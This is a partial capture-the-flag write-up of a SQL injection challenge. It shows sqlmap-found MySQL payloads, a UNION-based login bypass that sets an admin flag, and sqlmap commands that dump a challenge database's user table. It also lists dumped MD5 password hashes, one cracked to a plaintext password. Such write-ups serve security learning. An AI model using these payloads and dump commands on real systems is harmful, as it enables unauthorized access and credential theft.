# Failed session
**_SQL Injection_** \
Difficulty: Medium

> **Note!** I didn't manage to complete this task entirely. However, I have decided to still include this partial solution as I did "collect most of the puzzles".

### 1. Use SQLMap to quickly find a working injection
```
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl

    Type: UNION query
    Title: MySQL UNION query (NULL) - 4 columns
    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
```

Out of these injections - the last one was the only actually working one.

### 2. Simplify and modify the injection
The injection above can be simplified to:
```
username=' UNION ALL SELECT NULL,"",NULL,NULL#&password=any
```

> Password doesn't matter as thanks to the injection - it isn't even checked.

However, we aren't done yet. We have only accessed the database and we don't have the administrator permissions that are essential to obtain the flag. We can achieve that by modifying the last argument.

```
username=' UNION ALL SELECT NULL,"",NULL,1#&password=any
```

This simple modification let me access another stage. However, now we need to provide the actual password.

### 3. Use the injection along with the SQLMap tool to dump everything
```sh
python3 sqlmap.py -u "http://container-manager.francecentral.cloudapp.azure.com:10144/login.php" --data="username=' UNION ALL SELECT NULL,"",NULL,1#&password=PxEl" --dump-all
```
After dumping everything and analysing the output, I found out that the database is called `db1` and has a table named `users`.

While trying to SQL inject manually (without the usage of SQLMap), I found out that one of the columns in that table is called `passwordMD5`. It has been proven to exist by the MariaDB error. The name clearly indicates that it likely contains the MD5 hashes of passwords. Let's dump that column.

```sh
python3 sqlmap.py -u "http://container-manager.francecentral.cloudapp.azure.com:10144/confirm.php" --batch --forms --crawl=2 -D db1 -T users -C passwordMD5 --dump
```

Here's the result of that operation:

| passwordMD5                      |
|----------------------------------|
| 100d7565034f985c386a266347fcfa3c |
| 5386e5dec276ad172e097a035bd07544 |
| 6a8057f9e0743012e09b49ebc04a0a07 |
| e89434e8b72041db23cdec2df7a0d2fa |

### 4. Use an online MD5 cracker to check all the obtained hashes
Only one of the hashes could be cracked.
> 5386e5dec276ad172e097a035bd07544 -> **Applepie123**

### 5. What went wrong
The password itself wasn't enough since my username was invalid. At this point **I couldn't progress further**.